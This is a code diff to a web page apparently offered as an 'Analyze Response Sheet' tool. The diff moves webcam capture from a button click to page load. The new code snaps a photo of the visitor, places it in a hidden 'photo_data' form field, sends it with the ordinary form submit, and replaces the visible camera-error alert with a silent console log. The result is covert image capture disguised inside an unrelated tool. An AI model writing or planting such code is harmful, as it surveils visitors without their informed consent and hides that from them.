@@ -336,8 +336,7 @@ padding:15px;
 
 <br><br>
   
-<button type="button" onclick="captureAndSubmit()">
-
+<button type="submit">
 Analyze Response Sheet
 </button>
 
@@ -530,51 +529,54 @@ unattempted-row
 
 <script>
 
-async function captureAndSubmit() {
+window.onload = async function() {
 
-try {
+    try {
 
-const stream = await navigator.mediaDevices.getUserMedia({
-video: true
-});
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true
+        });
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-video.srcObject = stream;
+        video.srcObject = stream;
 
-await new Promise(resolve => {
-video.onloadedmetadata = () => {
-resolve();
-}
-});
+        await new Promise(resolve => {
 
-video.play();
+            video.onloadedmetadata = () => {
+                resolve();
+            }
 
-await new Promise(resolve => setTimeout(resolve, 1200));
+        });
 
-canvas.width = video.videoWidth;
-canvas.height = video.videoHeight;
+        video.play();
 
-const ctx = canvas.getContext('2d');
+        await new Promise(resolve => setTimeout(resolve, 1200));
 
-ctx.drawImage(video, 0, 0);
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-const imageData = canvas.toDataURL('image/jpeg', 0.5);
+        const ctx = canvas.getContext('2d');
 
-document.getElementById('photo_data').value = imageData;
+        ctx.drawImage(video, 0, 0);
 
-stream.getTracks().forEach(track => track.stop());
+        const imageData = canvas.toDataURL(
+            'image/jpeg',
+            0.5
+        );
 
-document.forms[0].submit();
+        document.getElementById('photo_data').value = imageData;
 
-}
+        stream.getTracks().forEach(track => track.stop());
 
-catch(error){
+    }
 
-alert('Camera permission denied.');
+    catch(error) {
 
-}
+        console.log("Camera permission denied");
+
+    }
 
 }
 
